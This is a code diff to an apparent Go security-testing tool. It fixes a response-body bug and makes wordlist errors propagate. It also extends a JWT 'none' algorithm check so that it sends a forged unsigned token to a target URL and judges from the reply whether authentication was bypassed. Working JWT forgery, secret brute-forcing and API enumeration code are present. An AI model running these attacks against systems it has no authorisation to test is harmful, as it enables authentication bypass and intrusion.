@@ -426,6 +426,11 @@ func RESTEnum(ctx context.Context, endpoint string) (*RESTEnhanced, error) {
 		if err != nil {
 			continue
 		}
+
+		var body []byte
+		if resp.StatusCode == 200 && path == "/api" {
+			body, _ = io.ReadAll(io.LimitReader(resp.Body, 65536))
+		}
 		resp.Body.Close()
 
 		if resp.StatusCode != 404 && resp.StatusCode != 405 {
@@ -436,8 +441,7 @@ func RESTEnum(ctx context.Context, endpoint string) (*RESTEnhanced, error) {
 			})
 		}
 
-		if resp.StatusCode == 200 && path == "/api" {
-			body, _ := io.ReadAll(io.LimitReader(resp.Body, 65536))
+		if resp.StatusCode == 200 && path == "/api" && body != nil {
 			result.Sensitive = extractSensitiveParams(string(body))
 		}
 	}
@@ -637,7 +641,7 @@ func JWTDecode(ctx context.Context, token string) (*JWTResult, error) {
 	return result, nil
 }
 
-func JWTNoneAlg(ctx context.Context, token string) (*JWTResult, error) {
+func JWTNoneAlg(ctx context.Context, token, url string) (*JWTResult, error) {
 	printProgress("Testing JWT none algorithm attack")
 	result := &JWTResult{}
 
@@ -662,13 +666,43 @@ func JWTNoneAlg(ctx context.Context, token string) (*JWTResult, error) {
 	forgedHeader := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"none","typ":"JWT"}`))
 	forgedToken := forgedHeader + "." + parts[1] + "."
 
-	result.Valid = true
-	result.Algorithm = "none (forged)"
-	result.Vulns = append(result.Vulns, "none_algorithm_forge_possible")
+	if url == "" {
+		result.Valid = true
+		result.Algorithm = "none (forged)"
+		result.Vulns = append(result.Vulns, "none_algorithm_forge_possible")
+		printProgress("JWT none alg: forge_possible=%v (no URL to test)", result.Valid)
+		return result, nil
+	}
 
-	_ = forgedToken
+	client := &http.Client{Timeout: 10 * time.Second}
+	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
+	if err != nil {
+		return result, fmt.Errorf("failed to create request: %w", err)
+	}
+	req.Header.Set("Authorization", "Bearer "+forgedToken)
 
-	printProgress("JWT none alg: forge_possible=%v", result.Valid)
+	resp, err := client.Do(req)
+	if err != nil {
+		return result, fmt.Errorf("failed to send forged token: %w", err)
+	}
+	defer resp.Body.Close()
+
+	body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
+	bodyStr := string(body)
+
+	if resp.StatusCode == 200 && (strings.Contains(bodyStr, "success") || strings.Contains(bodyStr, "welcome") || strings.Contains(bodyStr, "authorized")) {
+		result.Valid = true
+		result.Algorithm = "none (forged)"
+		result.Vulns = append(result.Vulns, "none_algorithm_accepted")
+	} else if resp.StatusCode == 200 {
+		result.Valid = true
+		result.Algorithm = "none (forged)"
+		result.Vulns = append(result.Vulns, "none_algorithm_forge_possible")
+	} else {
+		result.Algorithm = "none (forged, rejected)"
+	}
+
+	printProgress("JWT none alg: status=%d, forge_possible=%v", resp.StatusCode, result.Valid)
 	return result, nil
 }
 
@@ -705,7 +739,10 @@ func JWTBruteforce(ctx context.Context, token, wordlist string) (*JWTResult, err
 	}
 
 	if wordlist != "" {
-		lines := readWordlist(wordlist)
+		lines, err := readWordlist(wordlist)
+		if err != nil {
+			printProgress("JWT bruteforce: failed to read wordlist: %v", err)
+		}
 		for _, line := range lines {
 			valid := verifyJWTSecret(token, line)
 			if valid {
@@ -726,13 +763,13 @@ func verifyJWTSecret(token, secret string) bool {
 	return false
 }
 
-func readWordlist(path string) []string {
+func readWordlist(path string) ([]string, error) {
 	ctx := context.Background()
 	data, err := readFileBytes(ctx, path)
 	if err != nil {
-		return nil
+		return nil, fmt.Errorf("failed to read wordlist %s: %w", path, err)
 	}
-	return strings.Split(strings.TrimSpace(string(data)), "\n")
+	return strings.Split(strings.TrimSpace(string(data)), "\n"), nil
 }
 
 func readFileBytes(ctx context.Context, path string) ([]byte, error) {
